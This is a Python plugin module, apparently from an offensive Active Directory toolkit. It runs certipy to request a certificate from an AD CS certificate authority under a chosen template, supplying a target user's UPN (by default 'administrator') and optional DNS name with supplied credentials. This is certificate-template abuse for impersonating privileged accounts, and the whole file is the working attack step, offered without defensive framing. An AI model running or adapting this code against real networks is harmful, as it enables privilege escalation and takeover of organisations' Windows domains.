import subprocess
from pathlib import Path

def run(data, cred, args):
    extra = getattr(args, "extra", []) or []

    if not extra:
        print("[-] Missing template name")
        return data

    template = extra[0]

    # -------------------------
    # Optional args
    # -------------------------
    target_user = "administrator"
    dns = None
    out_dir = None # Added for path control

    for i in range(len(extra)):
        if extra[i] == "--user" and i + 1 < len(extra):
            target_user = extra[i + 1]
        if extra[i] == "--dns" and i + 1 < len(extra):
            dns = extra[i + 1]
        if extra[i] == "--out" and i + 1 < len(extra): # New check
            out_dir = Path(extra[i + 1])

    # ... [Keep Resolve target/CA/cred logic the same] ...
    ip = data.get("ip")
    domain = data.get("domain")
    ca = data.get("adcs", {}).get("ca")
    username = cred.get("user")
    password = cred.get("secret") if cred.get("type") == "password" else None

    # -------------------------
    # Build command
    # -------------------------
    cmd = [
        "certipy", "req",
        "-username", username,
        "-password", password,
        "-ca", ca,
        "-dc-ip", ip,
        "-template", template,
        "-upn", f"{target_user}@{domain}",
        "-debug"
    ]

    if dns:
        cmd.extend(["-dns", dns])

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # Execute with CWD
    # -------------------------
    try:
        # If out_dir is provided, certipy will drop the .pfx there
        subprocess.run(cmd, cwd=out_dir) 
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return data

    return data